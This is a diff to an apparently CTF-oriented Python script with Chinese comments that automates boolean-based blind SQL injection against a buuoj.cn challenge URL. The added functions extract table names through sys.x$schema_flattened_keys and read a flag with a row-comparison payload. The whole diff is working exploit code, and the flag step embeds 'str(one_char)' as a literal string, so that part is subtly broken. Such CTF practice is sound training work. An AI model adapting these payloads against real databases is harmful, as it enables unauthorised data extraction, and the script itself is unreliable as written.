@@ -1,4 +1,5 @@
 import requests
+import time
 
 def get_database(url,strings):
     database_length = 1
@@ -21,12 +22,52 @@ def get_database(url,strings):
             if 'Nu1L' in rs.text:
                 DBname = DBname + one_char
                 print("\r", end="")
-                print('正在获取数据库名称，当前已获取到'+str(i)+'位 | '+DBname, end='')
+                print('正在获取数据库名称，当前已获取到'+str(i)+'位 | '+DBname.lower(), end='')
                 break
-    print('结束')
+
+def get_tablename(url,strings):
+    TBname = ''
+    print('表名字读取中...')
+    for i in range(1, 100):
+        for one_char in strings:
+            data = {
+                'id': "1&&substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database())," + str(
+                    i) + ",1)='"+str(one_char)+"'"
+            }
+            time.sleep(0.05)
+            rs = requests.post(url,data)
+            if 'Nu1L' in rs.text:
+                TBname = TBname + one_char
+                print("\r", end="")
+                print('表的名字为：' + TBname.lower(), end='')
+                break
+            if 'Nu1L' not in rs.text and one_char == '~':
+                return ''
+
+def get_column(url,strings):
+    column_name = ''
+    tmp = ''
+    print('\nflag信息读取中...')
+    for i in range(1, 100):
+        for one_char in strings:
+            one_char = column_name + one_char
+            data = {
+               'id':"1&&((select 1,'str(one_char)') > (select * from f1ag_1s_h3r3_hhhhh))"
+            }
+            time.sleep(0.05)
+            rs = requests.post(url,data)
+            if 'Nu1L' not in rs.text:
+                tmp = one_char
+            if 'Nu1L' in rs.text:
+                column_name = tmp
+                print("\r", end="")
+                print('flag为：' + column_name.lower(), end='')
+                break
 
 if __name__ == '__main__':
-    url = 'http://e2df23b3-84f5-44e4-9eba-3134fe22b56e.node4.buuoj.cn:81/index.php'
-    #不要修改string的顺序，是按asii码排列的，最后获取flag会用到
-    strings = '-./0123456789:;<>=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~#'
+    url = 'http://2968b420-1389-42a0-9c78-5c5b85df638a.node4.buuoj.cn:81/index.php'
+    strings = ',-./0123456789:;<>=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~#'
     get_database(url,strings)
+    get_tablename(url,strings)
+    #原来是想着获取column名称，但是未获取到，但是又懒得改名称，所以使用的是column
+    get_column(url,strings)
